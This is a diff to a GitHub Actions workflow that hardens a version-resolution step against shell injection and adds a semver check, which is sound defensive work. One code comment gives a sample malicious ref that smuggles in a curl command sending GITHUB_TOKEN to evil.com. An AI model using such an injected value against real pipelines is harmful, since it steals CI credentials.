@@ -26,15 +26,34 @@ jobs:
 
       - name: Resolve image version
         id: version
+        env:
+          # Interpolate user-controlled inputs.ref into an env var rather than
+          # the script body. Direct ${{ }} interpolation in `run:` is a known
+          # GitHub Actions shell-injection antipattern: a crafted ref like
+          # `v1.0" ] && curl evil.com/?t=$GITHUB_TOKEN && [ "x` would execute
+          # arbitrary commands in the runner. github.event_name and
+          # github.ref_name are GitHub-controlled and safe to interpolate.
+          INPUT_REF: ${{ inputs.ref }}
         run: |
           # For workflow_dispatch with an explicit ref input, use it as the
           # version source so metadata-action computes semver tags correctly.
           # For tag-triggered runs, github.ref_name already holds the tag (e.g. v1.3).
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ] && [ -n "${{ inputs.ref }}" ]; then
-            echo "value=${{ inputs.ref }}" >> $GITHUB_OUTPUT
+          if [ "${{ github.event_name }}" = "workflow_dispatch" ] && [ -n "$INPUT_REF" ]; then
+            VALUE="$INPUT_REF"
           else
-            echo "value=${{ github.ref_name }}" >> $GITHUB_OUTPUT
+            VALUE="${{ github.ref_name }}"
           fi
+
+          # Guard: must be a semver tag (vX.Y or vX.Y.Z). Without this, dispatching
+          # with ref=main (or any non-semver) silently produces no semver tags from
+          # metadata-action, and the image is pushed only as :latest, overwriting
+          # the current latest with an unversioned build.
+          if ! echo "$VALUE" | grep -qE '^v[0-9]+\.[0-9]+(\.[0-9]+)?$'; then
+            echo "::error::ref must be a semver tag like v1.3 or v1.3.1 (got: $VALUE)"
+            exit 1
+          fi
+
+          echo "value=$VALUE" >> $GITHUB_OUTPUT
 
       - name: Set up QEMU
         uses: docker/setup-qemu-action@v3
